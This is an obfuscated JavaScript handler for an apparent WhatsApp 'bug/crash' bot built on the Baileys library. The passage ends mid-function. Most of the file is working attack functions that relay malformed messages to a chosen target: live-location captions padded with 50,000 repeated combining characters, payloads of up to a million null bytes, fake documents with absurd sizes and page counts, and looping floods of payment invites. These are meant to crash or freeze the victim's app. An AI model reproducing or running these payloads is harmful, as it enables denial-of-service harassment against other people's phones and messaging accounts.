require("./settings");
require("./lib/language");
require("./lib/virtex/virus");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore
} = global.baileys1;
const fs = require('fs');
const util = require("util");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const {
  smsg,
  tanggal,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
  generateProfilePicture
} = require("./lib/storage");
const jsobfus = require("javascript-obfuscator");
module.exports = rxhl = async (_0x2f9d2e, _0x18a4d7, _0x947ae8, _0x1b5961) => {
  try {
    var _0x7baced = _0x18a4d7.mtype === "conversation" ? _0x18a4d7.message.conversation : _0x18a4d7.mtype == "imageMessage" ? _0x18a4d7.message.imageMessage.caption : _0x18a4d7.mtype == "videoMessage" ? _0x18a4d7.message.videoMessage.caption : _0x18a4d7.mtype == "extendedTextMessage" ? _0x18a4d7.message.extendedTextMessage.text : _0x18a4d7.mtype == "buttonsResponseMessage" ? _0x18a4d7.message.buttonsResponseMessage.selectedButtonId : _0x18a4d7.mtype == "listResponseMessage" ? _0x18a4d7.message.listResponseMessage.singleSelectReply.selectedRowId : _0x18a4d7.mtype == "templateButtonReplyMessage" ? _0x18a4d7.message.templateButtonReplyMessage.selectedId : _0x18a4d7.mtype === "messageContextInfo" ? _0x18a4d7.message.buttonsResponseMessage?.["selectedButtonId"] || _0x18a4d7.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x18a4d7.text : '';
    var _0x30577f = typeof _0x18a4d7.text == "string" ? _0x18a4d7.text : '';
    var _0x11f9b4 = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x7baced) ? _0x7baced.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '' : global.prefa ?? global.prefix;
    const _0x340bea = JSON.parse(fs.readFileSync("./lib/owner.json"));
    const _0x5f1fae = JSON.parse(fs.readFileSync("./lib/murbug.json"));
    const _0x63bd7f = _0x7baced.startsWith(_0x11f9b4) ? _0x7baced.slice(_0x11f9b4.length).trim().split(" ").shift().toLowerCase() : '';
    const _0xe61016 = _0x7baced.trim().split(/ +/).slice(1);
    const _0xffbfb1 = await _0x2f9d2e.decodeJid(_0x2f9d2e.user.id);
    const _0x4cefc4 = [_0xffbfb1, ..._0x340bea].map(_0x20618f => _0x20618f.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x18a4d7.sender);
    const _0x4d4b5c = [_0xffbfb1, ..._0x5f1fae].map(_0x119522 => _0x119522.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x18a4d7.sender);
    const _0x2a2cee = q = _0xe61016.join(" ");
    const _0x38c03a = _0x18a4d7.quoted ? _0x18a4d7.quoted : _0x18a4d7;
    const _0x537416 = mek.key.remoteJid;
    const {
      spawn: _0x263a00,
      exec: _0x5a36ba
    } = require("child_process");
    const _0x468496 = _0x18a4d7.isGroup ? await _0x2f9d2e.groupMetadata(_0x537416)["catch"](_0x4dadd => {}) : '';
    const _0x5e087d = _0x18a4d7.isGroup ? await _0x468496.participants : '';
    const _0x535f43 = _0x18a4d7.isGroup ? await getGroupAdmins(_0x5e087d) : '';
    const _0x283f1a = _0x18a4d7.isGroup ? _0x535f43.includes(_0xffbfb1) : false;
    const _0x23083c = _0x18a4d7.isGroup ? _0x535f43.includes(_0x18a4d7.sender) : false;
    const _0x4cb438 = _0x18a4d7.pushName || "No Name";
    const _0x35f781 = moment(Date.now()).tz("Asia/Jakarta").locale('id').format("HH:mm:ss z");
    const _0x3a5321 = fs.readFileSync("./lib/image/rxhl.jpg");
    const _0x5d666c = (_0x38c03a.msg || _0x38c03a).mimetype || '';
    const {
      uptotelegra: _0xb3bae
    } = require("./lib/upload");
    const {
      TelegraPh: _0x1268c9,
      UploadFileUgu: _0x3049a7,
      webp2mp4File: _0x5cd6da,
      floNime: _0x37eccc
    } = require("./lib/uploader");
    const _0x2f1d7d = fs.readFileSync("./lib/image/slayer07.jpg");
    const _0xaf6616 = require("ytdl-core");
    const _0x14ed4e = require("pino");
    const {
      startbot: _0x4bf414,
      stopjadibot: _0x5db576
    } = require("./lib/start");
    const _0x4bbbca = '💯' + 'ꦾ'.repeat(50000);
    const _0x3ba96a = fs.readFileSync("./lib/image/qris.jpg");
    if (!_0x2f9d2e["public"]) {
      if (!_0x4cefc4) {
        return;
      }
    }
    if (_0x63bd7f) {
      console.log('');
      console.log(chalk.white(chalk.bgHex("#4a69bd").bold("🚀 WhatsApp messages! 🚀")));
      console.log(chalk.black(chalk.bgHex("#fdcb6e")("📅 DATE: " + _0x35f781 + "\n💬 MESSAGE: " + _0x63bd7f + "\n🗣️ SENDERNAME: " + _0x4cb438 + "\n👤 JIDS: " + _0x18a4d7.sender)));
    }
    let _0x1e5521 = ["recording"];
    let _0x356c8c = _0x1e5521[Math.floor(Math.random() * _0x1e5521.length)];
    if (_0x18a4d7.message) {
      _0x2f9d2e.sendPresenceUpdate(_0x356c8c, _0x537416);
    }
    async function _0x333a9e() {
      var _0x3c32f4 = ["《 █▒▒▒▒▒▒▒▒▒▒▒》10%", "《 ████▒▒▒▒▒▒▒▒》30%", "《 ███████▒▒▒▒▒》50%", "《 ██████████▒▒》80%", "《 ████████████》100%", "𝐋𝐨𝐚𝐝𝐢𝐧𝐠 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞..."];
      const _0x19bb34 = {
        text: "𝐑𝐱𝐡𝐋 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥..."
      };
      let {
        key: _0x5a5e1d
      } = await _0x2f9d2e.sendMessage(_0x537416, _0x19bb34);
      for (let _0x33bb67 = 0; _0x33bb67 < _0x3c32f4.length; _0x33bb67++) {
        const _0x22711a = {
          text: _0x3c32f4[_0x33bb67],
          edit: _0x5a5e1d
        };
        await _0x2f9d2e.sendMessage(_0x537416, _0x22711a);
      }
    }
    async function _0x3c3c20(_0x4d4960) {
      return new Promise((_0x550110, _0x3be67f) => {
        try {
          const _0x4ad468 = {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 0x1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 0x1
          };
          const _0x62da90 = jsobfus.obfuscate(_0x4d4960, _0x4ad468);
          const _0x2a92e5 = {
            'status': 0xc8,
            'author': 'Me',
            'result': _0x62da90.getObfuscatedCode()
          };
          _0x550110(_0x2a92e5);
        } catch (_0xd5e46b) {
          _0x3be67f(_0xd5e46b);
        }
      });
    }
    _0x2f9d2e.sendButton = async (_0x5e7bb1, _0x415da5, _0x1d1185, _0x4aedf6 = {}) => {
      const _0x26fe4e = {
        text: _0x4aedf6 && _0x4aedf6.body ? _0x4aedf6.body : ''
      };
      const _0x2cb77c = {
        text: _0x4aedf6 && _0x4aedf6.footer ? _0x4aedf6.footer : ''
      };
      const _0x3b523b = {
        buttons: _0x415da5,
        messageParamsJson: ''
      };
      const _0xde624d = {
        body: _0x26fe4e,
        footer: _0x2cb77c,
        nativeFlowMessage: _0x3b523b
      };
      const _0x435ef9 = {
        interactiveMessage: _0xde624d
      };
      const _0x491185 = {
        message: _0x435ef9
      };
      const _0x56ea12 = {
        viewOnceMessage: _0x491185
      };
      const _0x529a4f = {
        quoted: _0x1d1185
      };
      let _0x2fd9e2 = generateWAMessageFromContent(_0x5e7bb1, _0x56ea12, _0x529a4f);
      await _0x2f9d2e.sendPresenceUpdate("composing", _0x5e7bb1);
      return _0x2f9d2e.relayMessage(_0x5e7bb1, _0x2fd9e2.message, {
        'messageId': _0x2fd9e2.key.id
      });
    };
    const _0x11ab14 = {
      remoteJid: "status@broadcast"
    };
    const _0xf6dae4 = {
      'participant': "0@s.whatsapp.net",
      ...(_0x18a4d7.chat ? _0x11ab14 : {})
    };
    const _0x520c69 = {
      hasMediaAttachment: true,
      jpegThumbnail: _0x3a5321
    };
    const _0x1baad7 = {
      name: "review_and_pay",
      buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"RxhlOfficial ✅\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
    };
    const _0x50a4f6 = {
      buttons: [_0x1baad7]
    };
    const _0x59cae2 = {
      header: _0x520c69,
      nativeFlowMessage: _0x50a4f6
    };
    const _0x1ea1cc = {
      interactiveMessage: _0x59cae2
    };
    const _0x2cdb40 = {
      key: _0xf6dae4,
      message: _0x1ea1cc
    };
    const _0x261383 = {
      remoteJid: "status@broadcast"
    };
    const _0x2fcebe = {
      'participant': "0@s.whatsapp.net",
      ...(_0x18a4d7.chat ? _0x261383 : {})
    };
    const _0xc350c3 = {
      title: "RxhlOfc"
    };
    const _0x1dfa14 = {
      listResponseMessage: _0xc350c3
    };
    const _0x35da8d = {
      key: _0x2fcebe,
      message: _0x1dfa14
    };
    async function _0x32754e(_0x4656ed, _0x39c0f4) {
      var _0x5733e6 = generateWAMessageFromContent(_0x4656ed, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "RXHL BUG WHATSAPP ✅" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4656ed,
        'quoted': _0x39c0f4
      });
      await _0x2f9d2e.relayMessage(_0x4656ed, _0x5733e6.message, {
        'participant': {
          'jid': _0x4656ed
        },
        'messageId': _0x5733e6.key.id
      });
    }
    async function _0x43ea20(_0x3fc10d, _0x4c41b5) {
      const _0x5d0cad = {
        upload: _0x2f9d2e.waUploadToServer
      };
      const _0x3cc26e = {
        text: ''
      };
      var _0x281db7 = generateWAMessageFromContent(_0x3fc10d, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': "RxhlCrash",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg"
              }
            }, _0x5d0cad))
          },
          'body': _0x3cc26e,
          'footer': {
            'text': "›          #RxhlOfficial"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }), {
        'userJid': _0x3fc10d,
        'quoted': _0x4c41b5
      });
      await _0x2f9d2e.relayMessage(_0x3fc10d, _0x281db7.message, {
        'participant': {
          'jid': _0x3fc10d
        },
        'messageId': _0x281db7.key.id
      });
    }
    async function _0x1e091c(_0x4657d2, _0x4f02c2) {
      var _0x4ba1fc = generateWAMessageFromContent(_0x4657d2, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 0x3b9ac9ff,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "RXHL DOCUMENT ✅" + 'ྦྷ'.repeat(60000),
          'fileEncSha256': "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': _0x4657d2,
        'quoted': _0x4f02c2
      });
      await _0x2f9d2e.relayMessage(_0x4657d2, _0x4ba1fc.message, {
        'participant': {
          'jid': _0x4657d2
        },
        'messageId': _0x4ba1fc.key.id
      });
    }
    async function _0x4ae6a7(_0x127a46, _0x5867e5) {
      var _0x2761d5 = generateWAMessageFromContent(_0x127a46, proto.Message.fromObject({
        'stickerMessage': {
          'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': "image/webp",
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': "10116",
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': "1715881084144",
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x127a46,
        'quoted': _0x5867e5
      });
      await _0x2f9d2e.relayMessage(_0x127a46, _0x2761d5.message, {
        'participant': {
          'jid': _0x127a46
        },
        'messageId': _0x2761d5.key.id
      });
    }
    async function _0x40fd73(_0x834103) {
      const _0x17f0f0 = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: false
      };
      var _0x5f3410 = generateWAMessageFromContent(_0x834103, proto.Message.fromObject({
        'listMessage': {
          'title': "RXHL MODS WHATSAPP" + "\0".repeat(920000),
          'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x17f0f0
      }), {
        'userJid': _0x834103
      });
      await _0x2f9d2e.relayMessage(_0x834103, _0x5f3410.message, {
        'participant': {
          'jid': _0x834103
        },
        'messageId': _0x5f3410.key.id
      });
    }
    async function _0x2a4ade(_0x52222d) {
      var _0x2c5157 = generateWAMessageFromContent(_0x52222d, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x52222d
      });
      await _0x2f9d2e.relayMessage(_0x52222d, _0x2c5157.message, {
        'participant': {
          'jid': _0x52222d
        },
        'messageId': _0x2c5157.key.id
      });
    }
    async function _0x455c3d(_0x265aca) {
      const _0x4bf2cf = {
        title: '',
        subtitle: " "
      };
      const _0x2d682a = {
        text: 'xp'
      };
      var _0x36fa1e = generateWAMessageFromContent(_0x265aca, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x4bf2cf,
              'body': {
                'text': "RXHL MODS WHATSAPP"
              },
              'footer': _0x2d682a,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': _0x265aca
      });
      await _0x2f9d2e.relayMessage(_0x265aca, _0x36fa1e.message, {
        'participant': {
          'jid': _0x265aca
        },
        'messageId': _0x36fa1e.key.id
      });
    }
    async function _0x4990de(_0x17c1b3) {
      const _0xd19291 = {
        title: '',
        subtitle: " "
      };
      const _0x4e74b6 = {
        text: _0x4bbbca
      };
      var _0x314d2d = generateWAMessageFromContent(_0x17c1b3, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0xd19291,
              'body': {
                'text': "RXHL MODS WHATSAPP"
              },
              'footer': _0x4e74b6,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : , merchant_url :  }"
                }],
                'messageParamsJson': "RxhL"
              }
            }
          }
        }
      }), {
        'userJid': _0x17c1b3
      });
      await _0x2f9d2e.relayMessage(_0x17c1b3, _0x314d2d.message, {
        'participant': {
          'jid': _0x17c1b3
        },
        'messageId': _0x314d2d.key.id
      });
    }
    async function _0x120063(_0x48951e) {
      const _0x54e82b = {
        messageId: null
      };
      _0x2f9d2e.relayMessage(_0x48951e, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x48951e,
            'participant': _0x48951e,
            'quotedMessage': {
              'conversation': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x48951e
        }
      }, _0x54e82b);
    }
    async function _0x10ce4c(_0xbbcd33, _0x3e0803) {
      for (let _0x289b4d = 0; _0x289b4d < _0x3e0803; _0x289b4d++) {
        _0x40fd73(_0xbbcd33);
        await sleep(1500);
        _0x2a4ade(_0xbbcd33);
        await sleep(2000);
        _0x455c3d(_0xbbcd33);
        await sleep(500);
        _0x455c3d(_0xbbcd33);
        await sleep(500);
      }
    }
    async function _0x50af8b(_0x4bb83f) {
      await _0x2f9d2e.relayMessage(_0x4bb83f, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000
        }
      }, {});
      await sleep(200);
      await _0x2f9d2e.relayMessage(_0x4bb83f, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000
        }
      }, {
        'participant': {
          'jid': _0x4bb83f
        }
      });
      await sleep(200);
      await _0x2f9d2e.relayMessage(_0x4bb83f, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000
        }
      }, {});
    }
    async function _0x5bbaac(_0x1aec6b) {
      _0x50af8b(_0x1aec6b);
      await sleep(500);
      _0x120063(_0x1aec6b);
    }
    async function _0x54e078(_0x3a829d) {
      const _0x19e6f1 = generateWAMessageFromContent(_0x3a829d, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂Ù†؃؄Ù½؂Ù†؃؄Ù½".repeat(55000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x3a829d
      });
      await _0x2f9d2e.relayMessage(_0x3a829d, _0x19e6f1.message, {
        'participant': {
          'jid': _0x3a829d
        },
        'messageId': _0x19e6f1.key.id
      });
    }
    async function _0x97aad7(_0xda369b) {
      const _0x52c0db = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: true
      };
      const _0x4c9df7 = generateWAMessageFromContent(_0xda369b, proto.Message.fromObject({
        'listMessage': {
          'title': "RxhL" + "\0".repeat(999999),
          'footerText': '.',
          'description': '.',
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x52c0db
      }), {
        'userJid': _0xda369b
      });
      await _0x2f9d2e.relayMessage(_0xda369b, _0x4c9df7.message, {
        'participant': {
          'jid': _0xda369b
        },
        'messageId': _0x4c9df7.key.id
      });
    }
    async function _0xeab195(_0x1602af) {
      const _0x4b6078 = generateWAMessageFromContent(_0x1602af, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½" + "Ãª¦¾".repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x1602af
      });
      await _0x2f9d2e.relayMessage(_0x1602af, _0x4b6078.message, {
        'participant': {
          'jid': _0x1602af
        },
        'messageId': _0x4b6078.key.id
      });
    }
    async function _0x520740(_0x453cdd) {
      const _0x12baa0 = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: false
      };
      const _0x2f50e1 = generateWAMessageFromContent(_0x453cdd, proto.Message.fromObject({
        'listMessage': {
          'title': "SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸ UÃŒ¸IÃŒ¸ CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ¸" + "\0".repeat(920000),
          'footerText': "Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®",
          'description': "Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x12baa0
      }), {
        'userJid': _0x453cdd
      });
      await _0x2f9d2e.relayMessage(_0x453cdd, _0x2f50e1.message, {
        'participant': {
          'jid': _0x453cdd
        },
        'messageId': _0x2f50e1.key.id
      });
    }
    async function _0x4375af(_0x1a124f) {
      const _0x467f34 = generateWAMessageFromContent(_0x1a124f, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "RxhL"
              },
              'body': {
                'text': "RxhL"
              },
              'footer': {
                'text': "RxhL"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'RxhL', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'RxhL', url : , merchant_url :  }"
                }, {
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : 'RxhL', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(999999)
              }
            }
          }
        }
      }), {
        'userJid': _0x1a124f
      });
      await _0x2f9d2e.relayMessage(_0x1a124f, _0x467f34.message, {
        'participant': {
          'jid': _0x1a124f
        },
        'messageId': _0x467f34.key.id
      });
    }
    async function _0x2dc52e(_0x94664c) {
      var _0x2c0c83 = generateWAMessageFromContent(_0x94664c, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂Ù†؃؄Ù½؂Ù†؃؄Ù½" + "ê¦¾".repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x94664c
      });
      await _0x2f9d2e.relayMessage(_0x94664c, _0x2c0c83.message, {
        'participant': {
          'jid': _0x94664c
        },
        'messageId': _0x2c0c83.key.id
      });
    }
    async function _0x18d90c(_0xbbd520) {
      const _0x4886eb = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: false
      };
      const _0x53195c = generateWAMessageFromContent(_0xbbd520, proto.Message.fromObject({
        'listMessage': {
          'title': "؂Ù†؃؄Ù½؂Ù†؃؄Ù½" + "\0".repeat(920000),
          'footerText': '',
          'description': '',
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x4886eb
      }), {
        'userJid': _0xbbd520
      });
      await _0x2f9d2e.relayMessage(_0xbbd520, _0x53195c.message, {
        'participant': {
          'jid': _0xbbd520
        },
        'messageId': _0x53195c.key.id
      });
    }
    async function _0x2bf3ee(_0x4e23b0) {
      var _0x11ad8a = generateWAMessageFromContent(_0x4e23b0, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "𝕽𝖝𝖍𝕷 𝕮𝖗𝖆𝖘𝖍 👻" + 'ٌ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x4e23b0
      });
      await _0x2f9d2e.relayMessage(_0x4e23b0, _0x11ad8a.message, {
        'participant': {
          'jid': _0x4e23b0
        },
        'messageId': _0x11ad8a.key.id
      });
    }
    async function _0x6ce8c1(_0x459a14) {
      var _0x545f0a = generateWAMessageFromContent(_0x459a14, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "𝕽𝖝𝖍𝕷 𝕮𝖗𝖆𝖘𝖍 💦" + '݉'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x459a14
      });
      await _0x2f9d2e.relayMessage(_0x459a14, _0x545f0a.message, {
        'participant': {
          'jid': _0x459a14
        },
        'messageId': _0x545f0a.key.id
      });
    }
    async function _0x7a2784(_0x2ed785) {
      var _0x3684a0 = generateWAMessageFromContent(_0x2ed785, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "𝕽𝖝𝖍𝕷 𝕮𝖗𝖆𝖘𝖍 😛" + '௅݉'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x2ed785
      });
      await _0x2f9d2e.relayMessage(_0x2ed785, _0x3684a0.message, {
        'participant': {
          'jid': _0x2ed785
        },
        'messageId': _0x3684a0.key.id
      });
    }
    async function _0x528e4b(_0x2b0201) {
